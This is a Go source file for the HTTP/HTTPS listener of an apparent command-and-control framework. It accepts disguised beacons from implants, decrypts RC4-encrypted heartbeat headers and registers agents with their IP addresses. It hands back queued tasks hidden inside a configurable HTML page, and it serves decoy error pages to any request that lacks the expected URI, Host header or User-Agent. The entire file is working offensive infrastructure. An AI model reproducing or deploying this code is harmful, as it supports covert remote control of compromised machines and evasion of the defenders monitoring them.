package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type HTTPConfig struct {
	Ssl        bool     `json:"ssl"`
	HostBind   string   `json:"host_bind"`
	PortBind   string   `json:"port_bind"`
	PortAgent  string   `json:"callback_port"`
	HostsAgent []string `json:"hosts_agent"`

	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// Agent
	HttpMethod     string `json:"http_method"`
	Uri            string `json:"urn"`
	ParameterName  string `json:"hb_header"`
	UserAgent      string `json:"user_agent"`
	HostHeader     string `json:"host_header"`
	RequestHeaders string `json:"request_headers"`

	// Server
	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	Callback_servers string `json:"callback_servers"`
	Server_headers   string `json:"server_headers"`
	Protocol         string `json:"protocol"`
	EncryptKey       []byte `json:"encrypt_key"`
}

type HTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    HTTPConfig
	Name      string
	Active    bool
}

func (h *HTTP) Start() error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	//router := gin.Default()
	router.NoRoute(h.pageError)

	router.Use(func(c *gin.Context) {
		for header, value := range h.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	if h.Config.HttpMethod == "POST" {
		router.POST("/*endpoint", h.processRequest)
	} else if h.Config.HttpMethod == "GET" {
		router.GET("/*endpoint", h.processRequest)
	}

	h.Active = true

	h.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%s", h.Config.HostBind, h.Config.PortBind),
		Handler: router,
	}

	if h.Config.Ssl {
		fmt.Println("   ", "Started listener: https://"+h.Config.HostBind+":"+h.Config.PortBind)

		listenerPath := ListenerDataPath + "/" + h.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		h.Config.SslCertPath = listenerPath + "/listener.crt"
		h.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(h.Config.SslCert) == 0 || len(h.Config.SslKey) == 0 {
			err = h.generateSelfSignedCert(h.Config.SslCertPath, h.Config.SslKeyPath)
			if err != nil {
				h.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(h.Config.SslCertPath, h.Config.SslCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(h.Config.SslKeyPath, h.Config.SslKey, 0600)
			if err != nil {
				return err
			}
		}

		go func() {
			err = h.Server.ListenAndServeTLS(h.Config.SslCertPath, h.Config.SslKeyPath)
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			h.Active = true
		}()

	} else {
		fmt.Println("   ", "Started listener: http://"+h.Config.HostBind+":"+h.Config.PortBind)

		go func() {
			err = h.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			h.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (h *HTTP) Stop() error {
	var (
		ctx          context.Context
		cancel       context.CancelFunc
		err          error = nil
		listenerPath       = ListenerDataPath + "/" + h.Name
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	err = h.Server.Shutdown(ctx)
	return err
}

func (h *HTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		agentId      string
		beat         []byte
		bodyData     []byte
		responseData []byte
	)

	valid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		if h.Config.Uri == u.Path {
			valid = true
		}
	}
	if valid == false {
		h.pageError(ctx)
		return
	}

	if len(h.Config.HostHeader) > 0 {
		requestHost := ctx.Request.Host
		if h.Config.HostHeader != requestHost {
			h.pageError(ctx)
			return
		}
	}

	if h.Config.UserAgent != ctx.Request.UserAgent() {
		h.pageError(ctx)
		return
	}

	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	if h.Config.TrustXForwardedFor {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	}

	agentType, agentId, beat, bodyData, err = h.parseBeatAndData(ctx)
	if err != nil {
		goto ERR
	}

	if !ModuleObject.ts.TsAgentIsExists(agentId) {
		err = ModuleObject.ts.TsAgentCreate(agentType, agentId, beat, h.Name, ExternalIP, true)
		if err != nil {
			goto ERR
		}
	}

	_ = ModuleObject.ts.TsAgentProcessData(agentId, bodyData)

	responseData, err = ModuleObject.ts.TsAgentGetHostedTasks(agentId, SetMaxTaskDataSize)
	if err != nil {
		goto ERR
	} else {
		html := []byte(strings.ReplaceAll(h.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", string(responseData)))
		_, err = ctx.Writer.Write(html)
		if err != nil {
			fmt.Println("Failed to write to request: " + err.Error())
			h.pageError(ctx)
			return
		}
	}

	ctx.AbortWithStatus(http.StatusOK)
	return

ERR:
	fmt.Println("Error: " + err.Error())
	h.pageError(ctx)
}

func (h *HTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
	var (
		beat           string
		agentType      uint
		agentId        uint
		agentInfoCrypt []byte
		agentInfo      []byte
		bodyData       []byte
		err            error
	)

	params := ctx.Request.Header[h.Config.ParameterName]
	if len(params) > 0 {
		beat = params[0]
	} else {
		return "", "", nil, nil, errors.New("missing beat from Headers")
	}

	agentInfoCrypt, err = base64.StdEncoding.DecodeString(beat)
	if len(agentInfoCrypt) < 5 || err != nil {
		return "", "", nil, nil, errors.New("failed decrypt beat")
	}

	rc4crypt, errcrypt := rc4.NewCipher(h.Config.EncryptKey)
	if errcrypt != nil {
		return "", "", nil, nil, errors.New("rc4 decrypt error")
	}
	agentInfo = make([]byte, len(agentInfoCrypt))
	rc4crypt.XORKeyStream(agentInfo, agentInfoCrypt)

	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", "", nil, nil, errors.New("missing agent data")
	}

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, bodyData, nil
}

func (h *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	template.DNSNames = []string{h.Config.HostBind}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	h.Config.SslCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, h.Config.SslCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	h.Config.SslKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, h.Config.SslKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}

func (h *HTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(h.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}
